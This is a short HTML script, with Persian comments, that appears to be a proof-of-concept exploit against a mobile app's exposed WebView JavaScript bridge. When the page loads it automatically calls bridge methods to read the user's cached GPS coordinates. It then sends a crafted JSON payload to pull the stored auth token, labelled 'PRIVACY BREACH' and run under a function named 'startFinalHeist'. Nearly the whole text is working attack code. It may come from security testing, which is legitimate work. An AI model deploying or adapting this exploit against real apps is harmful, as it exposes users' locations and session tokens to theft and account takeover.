<script>
    function log(msg, critical = false) {
        var box = document.getElementById('logs');
        var color = critical ? "red" : "#0f0";
        box.innerHTML += "> <span style='color:"+color+"'>" + msg + "</span><br>";
    }

    function startFinalHeist() {
        log("Initiating Critical Data Extraction...");

        // ۱. اکسپلویت لوکیشن (اثبات نقض حریم خصوصی)
        if (window.Locate_a && window.Locate_a.getCachedLocationData) {
            var loc = window.Locate_a.getCachedLocationData();
            if (loc) {
                log("PRIVACY BREACH: User Coordinates Found!");
                // استخراج لاتیتود و لانگیتود بر اساس متد toJSONObjectForHybrid
                log("LAT: " + loc.lat + " | LNG: " + loc.lng, true);
            }
        }

        // ۲. اکسپلویت دیتابیس (فرمت صحیح فرمان برای H5URLCommand)
        if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
            // ایجاد آبجکت آرگومان که h5URLCommand آن را پارس می‌کند
            // طبق کد شما، این کلاس از Command String مقدار bussiness و key را می‌کشد بیرون
            var payload = JSON.stringify({
                "action": "IBUGetUserValue",
                "arguments": {
                    "bussiness": "common",
                    "key": "token"
                }
            });

            log("Executing IBUGetUserValue with Payload...");
            try {
                // صدا کردن متد با رشته JSON
                window.IBUStorageV2_a.IBUGetUserValue(payload);
                log("Command sent. Check Burp Suite or Callback for response.");
            } catch(e) {
                log("Error: " + e.message, true);
            }
        }
    }

    setTimeout(startFinalHeist, 2000);
</script>
